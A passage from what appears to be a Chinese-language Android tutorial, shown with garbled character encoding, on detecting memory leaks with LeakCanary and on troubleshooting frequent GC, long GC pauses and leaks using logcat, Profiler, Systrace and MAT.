<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†…å­˜æ³„æ¼ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// é™æ€å˜é‡æŒæœ‰Activity</span>
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        activity = <span class="hljs-built_in">this</span>;  <span class="hljs-comment">// å†…å­˜æ³„æ¼</span>
    }
}

<span class="hljs-comment">// LeakCanaryåˆ†æçš„å¼•ç”¨é“¾ï¼š</span>
<span class="hljs-comment">// MyActivityå®ä¾‹</span>
<span class="hljs-comment">//   â†‘ (è¢«å¼•ç”¨)</span>
<span class="hljs-comment">// static MyActivity.activity (é™æ€å˜é‡)</span>
<span class="hljs-comment">//   â†‘ (GC Root)</span>
<span class="hljs-comment">// </span>
<span class="hljs-comment">// æ³„æ¼è·¯å¾„ï¼šstatic MyActivity.activity -&gt; MyActivityå®ä¾‹</span>
</code></pre>
<p><strong>å¦‚ä½•ä½¿ç”¨ï¼š</strong></p>
<p><strong>1. æ·»åŠ ä¾èµ–</strong></p>
<pre><code class="hljs language-gradle" lang="gradle">dependencies {
    debugImplementation 'com.squareup.leakcanary:leakcanary-android:2.12'
}
</code></pre>
<p><strong>2. è¿è¡Œåº”ç”¨</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨é›†æˆåˆ°åº”ç”¨ä¸­</li>
<li>ä¸éœ€è¦é¢å¤–é…ç½®</li>
<li>ä¼šè‡ªåŠ¨ç›‘æ§Activityå’ŒFragment</li>
</ul>
<p><strong>3. è‡ªåŠ¨æ£€æµ‹</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å‘ç°æ³„æ¼æ—¶ä¼šæ˜¾ç¤ºé€šçŸ¥</li>
<li>ç‚¹å‡»é€šçŸ¥å¯ä»¥æŸ¥çœ‹æ³„æ¼è·¯å¾„</li>
</ul>
<p><strong>4. æŸ¥çœ‹æ³„æ¼æŠ¥å‘Š</strong></p>
<ul>
<li>LeakCanaryä¼šæ˜¾ç¤ºæ³„æ¼è·¯å¾„</li>
<li>å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°æ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>æ ¹æ®æ³„æ¼è·¯å¾„å¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è‡ªåŠ¨æ£€æµ‹</strong>ï¼šä¸éœ€è¦æ‰‹åŠ¨åˆ†æï¼Œè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li><strong>å¿«é€Ÿå‘ç°</strong>ï¼šèƒ½å¿«é€Ÿå‘ç°å†…å­˜æ³„æ¼ï¼Œæé«˜å¼€å‘æ•ˆç‡</li>
<li><strong>è¯¦ç»†è·¯å¾„</strong>ï¼šæ˜¾ç¤ºæ³„æ¼è·¯å¾„ï¼Œæ–¹ä¾¿å®šä½é—®é¢˜</li>
<li><strong>é€‚åˆå¼€å‘é˜¶æ®µ</strong>ï¼šåœ¨å¼€å‘é˜¶æ®µä½¿ç”¨ï¼ŒåŠæ—¶å‘ç°é—®é¢˜</li>
</ul>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>LeakCanaryåªåœ¨debugç‰ˆæœ¬ä¸­ä½¿ç”¨</li>
<li>ä¸è¦åœ¨ç”Ÿäº§ç‰ˆæœ¬ä¸­ä½¿ç”¨ï¼ˆä¼šå½±å“æ€§èƒ½ï¼‰</li>
<li>LeakCanaryä¼šæ¶ˆè€—ä¸€å®šçš„å†…å­˜å’ŒCPUèµ„æº</li>
</ul>
<h4 data-id="heading-68">5.2 GCé—®é¢˜æ’æŸ¥æ–¹æ³•</h4>
<p><strong>è¯´æ˜ï¼šè¿™éƒ¨åˆ†ä»‹ç»å¦‚ä½•æ’æŸ¥å¸¸è§çš„GCé—®é¢˜ï¼ŒåŒ…æ‹¬è¯†åˆ«ã€åŸå› åˆ†æã€æ’æŸ¥æ­¥éª¤å’Œè§£å†³æ–¹æ¡ˆ</strong></p>
<h4 data-id="heading-69">5.2.1 GCé¢‘ç¹é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> GCè§¦å‘è¿‡äºé¢‘ç¹ï¼Œå½±å“åº”ç”¨æ€§èƒ½</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šé€šè¿‡logcatæŸ¥çœ‹GCæ—¥å¿—</strong></p>
<ul>
<li>ä½¿ç”¨<code>adb logcat | grep GC</code>æŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡ä¸€æ®µæ—¶é—´å†…GCçš„æ¬¡æ•°</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡ProfileræŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>åœ¨Android Studio Profilerä¸­æŸ¥çœ‹å†…å­˜æ›²çº¿</li>
<li>è§‚å¯ŸGCäº‹ä»¶çš„é¢‘ç‡</li>
<li>å¦‚æœGCäº‹ä»¶å¯†é›†ï¼Œè¯´æ˜GCé¢‘ç¹</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸æƒ…å†µ</strong>ï¼šGCé¢‘ç‡è¾ƒä½ï¼ˆæ¯”å¦‚å‡ ç§’ä¸€æ¬¡ï¼‰</li>
<li><strong>å¼‚å¸¸æƒ…å†µ</strong>ï¼šGCé¢‘ç‡å¾ˆé«˜ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šGCå‡ ä¹ä¸é—´æ–­ï¼Œä¸¥é‡å½±å“æ€§èƒ½</li>
</ul>
<p><strong>å¯èƒ½çš„åŸå› ï¼š</strong></p>
<p><strong>1. é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li>ä»£ç ä¸­é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li>æ¯”å¦‚ï¼šå¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡ã€åˆ—è¡¨æ»‘åŠ¨æ—¶åˆ›å»ºå¯¹è±¡</li>
<li>å¯¼è‡´å¹´è½»ä»£å¿«é€Ÿå¡«æ»¡ï¼Œé¢‘ç¹è§¦å‘Partial GC</li>
</ul>
<p><strong>2. å†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜ä¸è¶³</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜é€æ¸è¢«å ç”¨</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼Œç³»ç»Ÿé¢‘ç¹è§¦å‘GCå°è¯•å›æ”¶å†…å­˜</li>
<li>ä½†æ³„æ¼çš„å¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼ŒGCæ— æ•ˆ</li>
</ul>
<p><strong>3. å¹´è½»ä»£è®¾ç½®å¤ªå°ï¼ˆç³»ç»Ÿè‡ªåŠ¨ç®¡ç†ï¼Œé€šå¸¸ä¸æ˜¯é—®é¢˜ï¼‰</strong></p>
<ul>
<li>å¹´è½»ä»£å¤ªå°ï¼Œå®¹æ˜“å¡«æ»¡</li>
<li>å¡«æ»¡åé¢‘ç¹è§¦å‘Partial GC</li>
</ul>
<p><strong>4. å¤§å¯¹è±¡é¢‘ç¹åˆ†é…</strong></p>
<ul>
<li>é¢‘ç¹åˆ›å»ºå¤§å¯¹è±¡ï¼ˆæ¯”å¦‚å¤§å›¾ç‰‡ï¼‰</li>
<li>å¤§å¯¹è±¡å¯èƒ½ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
<li>å¯¼è‡´è€å¹´ä»£å¿«é€Ÿå¡«æ»¡ï¼Œé¢‘ç¹è§¦å‘Full GC</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæŸ¥çœ‹GCæ—¥å¿—ï¼Œç¡®è®¤GCé¢‘ç‡</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡GCé¢‘ç‡ï¼ˆæ¯”å¦‚ï¼š10ç§’å†…è§¦å‘äº†å‡ æ¬¡GCï¼‰</li>
<li>è®°å½•GCç±»å‹ï¼ˆPartial GCè¿˜æ˜¯Full GCï¼‰</li>
<li>è®°å½•GCè€—æ—¶</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šä½¿ç”¨ProfileræŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨Profilerçš„"Allocation Tracking"åŠŸèƒ½</li>
<li>è®°å½•ä¸€æ®µæ—¶é—´å†…çš„å¯¹è±¡åˆ†é…</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«é¢‘ç¹åˆ†é…</li>
<li>æŸ¥çœ‹å¯¹è±¡åˆ†é…çš„è°ƒç”¨æ ˆ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</strong></p>
<ul>
<li>æ ¹æ®Profilerçš„åˆ†é…è®°å½•ï¼Œæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„ä»£ç ä½ç½®</li>
<li>å¸¸è§åœºæ™¯ï¼š
<ul>
<li>å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li>åˆ—è¡¨æ»‘åŠ¨æ—¶åˆ›å»ºå¯¹è±¡ï¼ˆonBindViewHolderï¼‰</li>
<li>åŠ¨ç”»æ’­æ”¾æ—¶åˆ›å»ºå¯¹è±¡</li>
<li>ç½‘ç»œè¯·æ±‚æ—¶åˆ›å»ºå¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šåˆ†æä»£ç ï¼Œæ‰¾å‡ºåŸå› </strong></p>
<ul>
<li>åˆ†æä»£ç ï¼Œæ‰¾å‡ºä¸ºä»€ä¹ˆé¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li>æ£€æŸ¥æ˜¯å¦æœ‰ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>æ£€æŸ¥æ˜¯å¦æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä¼˜åŒ–ä»£ç ï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–ä»£ç </li>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</strong></p>
<ul>
<li>å¯¹äºé¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>ç¤ºä¾‹ï¼šRecyclerViewçš„ViewHolderæ± ã€è‡ªå®šä¹‰å¯¹è±¡æ± </li>
</ul>
<p><strong>2. å‡å°‘ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>ä½¿ç”¨StringBuilderè€Œä¸æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥</li>
<li>é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li>å¤ç”¨å­—ç¬¦ä¸²ã€é¿å…åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
</ul>
<p><strong>3. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼Œé‡Šæ”¾è¢«å ç”¨çš„å†…å­˜</li>
</ul>
<p><strong>4. ä¼˜åŒ–æ•°æ®ç»“æ„</strong></p>
<ul>
<li>é€‰æ‹©åˆé€‚çš„é›†åˆç±»</li>
<li>åŠæ—¶æ¸…ç†é›†åˆï¼Œé¿å…é›†åˆæ³„æ¼</li>
</ul>
<p><strong>5. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li>é¿å…é¢‘ç¹åˆ›å»ºå¤§å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± ç®¡ç†å¤§å¯¹è±¡</li>
</ul>
<h4 data-id="heading-70">5.2.2 GCæš‚åœæ—¶é—´é•¿é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> GCæš‚åœæ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´åº”ç”¨å¡é¡¿</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šé€šè¿‡Systraceåˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>å¦‚æœä¸»çº¿ç¨‹åœ¨GCæœŸé—´è¢«é˜»å¡ï¼Œè¯´æ˜GCæš‚åœæ—¶é—´é•¿</li>
<li>æŸ¥çœ‹GCçš„æŒç»­æ—¶é—´</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡ProfileræŸ¥çœ‹GCè€—æ—¶</strong></p>
<ul>
<li>åœ¨Profilerä¸­æŸ¥çœ‹GCäº‹ä»¶</li>
<li>ç‚¹å‡»GCäº‹ä»¶ï¼ŒæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
<li>æŸ¥çœ‹GCçš„æš‚åœæ—¶é—´ï¼ˆpaused timeï¼‰</li>
</ul>
<p><strong>æ–¹æ³•3ï¼šé€šè¿‡logcatæŸ¥çœ‹GCæ—¥å¿—</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ä¸­çš„pausedæ—¶é—´</li>
<li>å¦‚æœpausedæ—¶é—´è¿‡é•¿ï¼ˆæ¯”å¦‚&gt;50msï¼‰ï¼Œä¼šå¯¼è‡´å¡é¡¿</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>Partial GC</strong>ï¼šæš‚åœæ—¶é—´é€šå¸¸å‡ æ¯«ç§’ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
<li><strong>Full GC</strong>ï¼šæš‚åœæ—¶é—´å¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°å¡é¡¿</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šæš‚åœæ—¶é—´&gt;100msï¼Œæ˜æ˜¾å¡é¡¿</li>
</ul>
<p><strong>å¯èƒ½çš„åŸå› ï¼š</strong></p>
<p><strong>1. Full GCé¢‘ç¹è§¦å‘</strong></p>
<ul>
<li>Full GCçš„æš‚åœæ—¶é—´æ¯”Partial GCé•¿å¾—å¤š</li>
<li>å¦‚æœFull GCé¢‘ç¹è§¦å‘ï¼Œä¼šå¯¼è‡´é¢‘ç¹å¡é¡¿</li>
<li>åŸå› ï¼šå†…å­˜æ³„æ¼ã€è€å¹´ä»£å¯¹è±¡å¤ªå¤š</li>
</ul>
<p><strong>2. å †å†…å­˜å¤ªå¤§ï¼Œå›æ”¶æ—¶é—´é•¿</strong></p>
<ul>
<li>å †å†…å­˜è¶Šå¤§ï¼ŒGCéœ€è¦å¤„ç†çš„å¯¹è±¡è¶Šå¤š</li>
<li>å›æ”¶æ—¶é—´è¶Šé•¿ï¼Œæš‚åœæ—¶é—´è¶Šé•¿</li>
</ul>
<p><strong>3. è€å¹´ä»£å¯¹è±¡å¤ªå¤š</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å¤šï¼ŒFull GCæ—¶éœ€è¦å¤„ç†çš„å¯¹è±¡å¤š</li>
<li>å›æ”¶æ—¶é—´é•¿ï¼Œæš‚åœæ—¶é—´é•¿</li>
</ul>
<p><strong>4. å¤§å¯¹è±¡å¤ªå¤š</strong></p>
<ul>
<li>å¤§å¯¹è±¡å ç”¨å†…å­˜å¤šï¼Œå›æ”¶æ…¢</li>
<li>å½±å“GCæ€§èƒ½ï¼Œå¯¼è‡´æš‚åœæ—¶é—´é•¿</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæŸ¥çœ‹GCæ—¥å¿—ï¼Œç¡®è®¤GCç±»å‹</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ï¼Œç¡®è®¤æ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>Partial GCæš‚åœæ—¶é—´çŸ­ï¼ŒFull GCæš‚åœæ—¶é—´é•¿</li>
<li>å¦‚æœFull GCé¢‘ç¹ï¼Œéœ€è¦é‡ç‚¹å…³æ³¨</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šåˆ†æGCè€—æ—¶</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ä¸­çš„pausedæ—¶é—´</li>
<li>å¦‚æœpausedæ—¶é—´è¿‡é•¿ï¼Œåˆ†æåŸå› </li>
<li>è®°å½•GCè€—æ—¶ï¼Œåˆ†æè¶‹åŠ¿</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šä½¿ç”¨Systraceåˆ†æGCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹åœ¨GCæœŸé—´çš„æ‰§è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹GCæ˜¯å¦å¯¼è‡´ä¸»çº¿ç¨‹é˜»å¡</li>
<li>æŸ¥çœ‹GCæ˜¯å¦å¯¼è‡´å¸§ç‡ä¸‹é™</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæ£€æŸ¥æ˜¯å¦æœ‰å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å†…å­˜æ³„æ¼ä¼šå¯¼è‡´è€å¹´ä»£æ»¡ï¼Œé¢‘ç¹è§¦å‘Full GC</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼å¯ä»¥å‡å°‘Full GC</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æè€å¹´ä»£å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨Profilerç”Ÿæˆå †è½¬å‚¨</li>
<li>åˆ†æè€å¹´ä»£ä¸­çš„å¯¹è±¡</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>åˆ†æä¸ºä»€ä¹ˆè¿™äº›å¯¹è±¡åœ¨è€å¹´ä»£</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. é¿å…è§¦å‘Full GCï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼Œåº”è¯¥å°½é‡é¿å…</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æ³„æ¼ä¼šå¯¼è‡´è€å¹´ä»£æ»¡ï¼‰</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</li>
</ul>
</li>
</ul>
<p><strong>2. å‡å°‘è€å¹´ä»£å¯¹è±¡</strong></p>
<ul>
<li>å‡å°‘é•¿æœŸå­˜æ´»çš„å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>é¿å…å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
</ul>
<p><strong>3. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼Œé‡Šæ”¾è¢«å ç”¨çš„å†…å­˜</li>
<li>å‡å°‘Full GCçš„è§¦å‘</li>
</ul>
<p><strong>4. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li>é¿å…é¢‘ç¹åˆ›å»ºå¤§å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± ç®¡ç†å¤§å¯¹è±¡</li>
</ul>
<p><strong>5. ä¼˜åŒ–GCæ€§èƒ½</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCé¢‘ç‡</li>
<li>è®©Partial GCæ›´é«˜æ•ˆ</li>
<li>é¿å…Full GC</li>
</ul>
<h4 data-id="heading-71">5.2.3 å†…å­˜æ³„æ¼é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> å†…å­˜æŒç»­å¢é•¿ï¼ŒGCæ— æ³•å›æ”¶ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šé€šè¿‡Profilerè§‚å¯Ÿå†…å­˜æ›²çº¿</strong></p>
<ul>
<li>åœ¨Profilerä¸­æŸ¥çœ‹å†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>å¦‚æœå†…å­˜æŒç»­å¢é•¿ï¼Œä¸ä¸‹é™ï¼Œå¯èƒ½æœ‰å†…å­˜æ³„æ¼</li>
<li>æ­£å¸¸æƒ…å†µï¼šå†…å­˜ä¼šå‘¨æœŸæ€§ä¸Šå‡å’Œä¸‹é™ï¼ˆGCå›æ”¶ï¼‰</li>
<li>å¼‚å¸¸æƒ…å†µï¼šå†…å­˜æŒç»­ä¸Šå‡ï¼Œä¸ä¸‹é™</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å‘ç°æ³„æ¼æ—¶ä¼šæ˜¾ç¤ºé€šçŸ¥</li>
<li>è¿™æ˜¯æœ€ç›´æ¥çš„æ–¹æ³•</li>
</ul>
<p><strong>æ–¹æ³•3ï¼šé€šè¿‡GCæ—¥å¿—åˆ†æ</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ï¼Œå¦‚æœGCé¢‘ç¹ä½†å†…å­˜ä¸ä¸‹é™</li>
<li>è¯´æ˜GCæ— æ³•å›æ”¶å¯¹è±¡ï¼Œå¯èƒ½æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸æƒ…å†µ</strong>ï¼šå†…å­˜ä¼šå‘¨æœŸæ€§ä¸Šå‡å’Œä¸‹é™</li>
<li><strong>å¼‚å¸¸æƒ…å†µ</strong>ï¼šå†…å­˜æŒç»­å¢é•¿ï¼Œä¸ä¸‹é™</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šå†…å­˜æŒç»­å¢é•¿ï¼Œæœ€ç»ˆOOM</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆæ¨èï¼‰</strong></p>
<ul>
<li>åœ¨å¼€å‘é˜¶æ®µï¼ŒLeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å¦‚æœå‘ç°æ³„æ¼ï¼Œä¼šæ˜¾ç¤ºé€šçŸ¥å’Œæ³„æ¼è·¯å¾„</li>
<li>æ ¹æ®æ³„æ¼è·¯å¾„ï¼Œå¯ä»¥å¿«é€Ÿå®šä½é—®é¢˜</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œå¿«é€Ÿå‘ç°ï¼Œæ˜¾ç¤ºæ³„æ¼è·¯å¾„</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šä½¿ç”¨Profilerè§‚å¯Ÿå†…å­˜è¶‹åŠ¿</strong></p>
<ul>
<li>åœ¨Profilerä¸­è§‚å¯Ÿå†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>å¦‚æœå†…å­˜æŒç»­å¢é•¿ï¼Œè®°å½•å†…å­˜å¢é•¿çš„æ—¶é—´ç‚¹</li>
<li>åˆ†æåœ¨ä»€ä¹ˆæ“ä½œåå†…å­˜å¼€å§‹å¢é•¿</li>
<li>æ‰¾å‡ºå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼çš„æ“ä½œ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨å†…å­˜å¢é•¿åï¼Œç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯ä»¥ç”Ÿæˆå¤šä¸ªå †è½¬å‚¨ï¼Œå¯¹æ¯”åˆ†æ</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šä½¿ç”¨MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€å †è½¬å‚¨æ–‡ä»¶</li>
<li>ä½¿ç”¨"Histogram"æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>ä½¿ç”¨"Dominator Tree"æŸ¥çœ‹å¯¹è±¡å¼•ç”¨å…³ç³»</li>
<li>ä½¿ç”¨"Path to GC Roots"æ‰¾å‡ºå¼•ç”¨é“¾</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡</strong></p>
<ul>
<li>æ ¹æ®MATçš„åˆ†æç»“æœï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡</li>
<li>åˆ†æè¿™äº›å¯¹è±¡ä¸ºä»€ä¹ˆæ— æ³•è¢«å›æ”¶</li>
<li>æ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰è¿™äº›å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šåˆ†æå¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>æ‰¾å‡ºæ³„æ¼çš„åŸå› ï¼š
<ul>
<li>é™æ€å˜é‡æŒæœ‰ï¼Ÿ</li>
<li>ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œï¼Ÿ</li>
<li>é›†åˆç±»æ³„æ¼ï¼Ÿ</li>
<li>å…¶ä»–åŸå› ï¼Ÿ</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤7ï¼šä¿®å¤ä»£ç </strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¿®å¤ä»£ç </li>
